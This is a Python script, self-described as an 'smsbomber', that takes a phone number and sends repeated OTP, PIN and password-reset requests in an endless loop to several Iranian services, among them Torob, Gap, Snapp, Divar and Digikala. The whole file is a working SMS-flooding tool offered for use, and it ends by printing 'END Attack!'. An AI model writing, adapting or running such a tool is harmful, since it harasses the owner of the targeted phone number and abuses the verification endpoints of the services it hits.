import requests ,os,time
from colorama import Fore,Style

os.system("clear" or "cls")
print("welcome to smsbomber null-programmer\n")
api_divar = 'https://api.divar.ir/v5/auth/authenticate'
api_snapp = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
api_bazar = 'https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest'
api_tejaratbank ='https://mbt.tejaratbank.ir/api/card-registration/verify'
api_torob = 'https://api.torob.com/a/phone/send-pin/?phone_number='
api_rubika = 'https://messengerg2c51.iranlms.ir/'
api_gap = 'https://core.gap.im/v1/user/add.json?mobile=0'
api_digikala = 'https://www.digikala.com/users/password/forgot/?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Ijk4OTE1NzI5MDUxNCJ9.xTLBD1nLklbqFWU7LRLWNFBNqeBSMyI8y7GvSZJ7Fzk&_back=https://www.digikala.com/'
number = input('Please Enter a Phone Number ( not support [+98], example [9157290214] : \n')
if "+98" in number:
    print("not support phone [+98] and [0] enter try again\n")
    number = input('Please Enter a Phone Number ( not support [+98], example [9157290214] : \n')
else:
    payload_digikala ={"remember[email_phone]" : "0"+number}
    try:
        digikala = 0

        while True:
            digikala = 0

            try:
                time.sleep(1)
                #--------------------------------------------------------------
                while digikala <=2:
                    req_torob = requests.get(api_torob+"0"+number)
                    digikala = digikala + 1
                    if req_torob.status_code == 200:
                        print("===> "+Fore.YELLOW+" Torob "+Fore.GREEN+"    success "+Fore.RESET)
                    else:
                        print("===> "+Fore.YELLOW+" Torob "+Fore.RED+"    ERROR "+Fore.RESET)

                #---------------------------------------------------------------

                #---------------------------------------------------------------
                digikala = 0
                while digikala <=2:
                    req_gap = requests.get(api_gap+number)
                    digikala = digikala + 1
                    if req_gap.status_code == 200:
                        print("===> "+Fore.YELLOW+" Gap "+Fore.GREEN+" success "+Fore.RESET)
                    else:
                        print("===> "+Fore.YELLOW+" Gap "+Fore.RED+" ERROR "+Fore.RESET)
                #---------------------------------------------------------------

                #---------------------------------------------------------------
                digikala = 0
                while digikala <=2:
                    req_snap = requests.post(api_snapp,data={'cellphone':'+98'+number})
                    digikala = digikala + 1
                    if req_snap.status_code == 200:
                        print("===> "+Fore.YELLOW+" Snapp "+Fore.GREEN+" success "+Fore.RESET)
                    else:
                        print("===> "+Fore.YELLOW+" Snapp "+Fore.RED+" ERROR "+Fore.RESET)
                #---------------------------------------------------------------

                #---------------------------------------------------------------
                digikala = 0
                while digikala <=2:
                    req_divar = requests.post(api_divar,json={'phone':f"0{number}"})
                    digikala = digikala + 1
                    if req_divar.status_code == 200:
                        print("===> "+Fore.YELLOW+" Divar "+Fore.GREEN+" success "+Fore.RESET)
                    else:
                        print("===> "+Fore.YELLOW+" Divar "+Fore.RED+" ERROR "+Fore.RESET)
                #---------------------------------------------------------------

                #---------------------------------------------------------------
                digikala = 0
                while digikala <= 2:
                    req_dijikala = requests.post(api_digikala,payload_digikala)
                    digikala = digikala + 1
                    if req_dijikala.status_code == 200:
                        print("===> "+Fore.YELLOW+" Digikala "+Fore.GREEN+" success "+Fore.RESET)
                    else:
                        print("===> "+Fore.YELLOW+" Digikala "+Fore.RED+" ERROR "+Fore.RESET)

            except Exception:
                print("no Internet connection!")
                break
    except:
        pass
print("END Attack!")
